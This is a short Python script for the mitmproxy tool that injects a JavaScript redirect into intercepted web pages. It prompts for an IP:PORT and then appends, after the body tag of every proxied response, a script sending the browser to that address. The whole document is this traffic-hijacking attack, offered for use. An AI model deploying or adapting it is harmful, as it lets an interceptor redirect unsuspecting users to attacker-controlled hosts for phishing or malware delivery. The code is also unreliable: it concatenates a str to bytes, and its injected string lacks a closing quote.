spoofip = input("\n"" " "\u001b[34;1mEnter the IP address to redirect to (IP:PORT): ") 
import mitmproxy
def response(flow):
    flow.response.content = flow.response.content.replace(b"</body>",b"</body><script>location = 'http://"+spoofip+"</script>")
